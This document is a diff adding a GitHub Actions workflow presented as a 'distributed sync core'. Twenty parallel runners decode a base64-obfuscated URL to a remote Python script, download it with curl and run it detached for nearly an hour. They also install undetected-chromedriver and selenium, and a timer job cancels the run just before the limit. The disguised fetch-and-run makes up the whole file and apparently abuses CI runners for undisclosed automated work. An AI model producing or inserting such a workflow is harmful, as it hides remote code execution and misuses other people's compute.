@@ -1,0 +1,91 @@
+name: Horizon Distributed Sync Core
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: horizon-sync-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Lifetime Manager: Sends cancel signal after execution threshold
+  # =================================================================
+  lifetime-manager:
+    name: "Lifetime Manager"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      RUN_LIMIT_SEC: 3540
+    steps:
+      - name: Await Expiration Window
+        run: |
+          echo "[LIFETIME] Active monitoring initialized for workflow: ${{ github.run_id }}"
+          echo "[LIFETIME] Holding thread for ${RUN_LIMIT_SEC} seconds."
+
+          sleep "${RUN_LIMIT_SEC}"
+
+          echo "[LIFETIME] Runtime cap reached. Issuing workflow revocation..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[LIFETIME] Revocation POST dispatched."
+
+  # =================================================================
+  # Sync Workers: Parallel background processing tasks
+  # =================================================================
+  sync-workers:
+    name: "SyncWorker-Slot-${{ matrix.slot_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        slot_id: [501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520]
+
+    steps:
+      - name: Install Base Dependencies
+        run: |
+          echo "[DEPS] Updating package indices and installing core binaries..."
+          sudo apt-get update -qq && sudo apt-get install -y curl python3-pip
+
+      - name: Pull Core Binary Script
+        run: |
+          echo "[PULL] Decoding target endpoint and retrieving binary..."
+          ENCODED_SRC="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
+          DECODED_SRC=$(python3 -c "import base64; print(base64.b64decode('$ENCODED_SRC').decode('utf-8'))")
+          curl -sL "$DECODED_SRC" -o sync_module.py
+          echo "[PULL] Binary module sync_module.py generated."
+
+      - name: Build Python Environment
+        run: |
+          echo "[PYTHON] Installing requirements..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      - name: Launch Processing Module
+        run: |
+          echo "[THREAD] Executing module on Slot-${{ matrix.slot_id }}..."
+
+          python3 sync_module.py &
+          WORKER_PID=$!
+
+          echo "[THREAD] Process detached with PID ${WORKER_PID}. Max window: 3540s."
+
+          sleep 3540
+
+          if kill -s 0 "$WORKER_PID" 2>/dev/null; then
+            echo "[THREAD] Timeout elapsed — forcing process termination."
+            kill -9 "$WORKER_PID"
+            echo "[THREAD] Process killed."
+          else
+            echo "[THREAD] Process completed execution independently."
+          fi
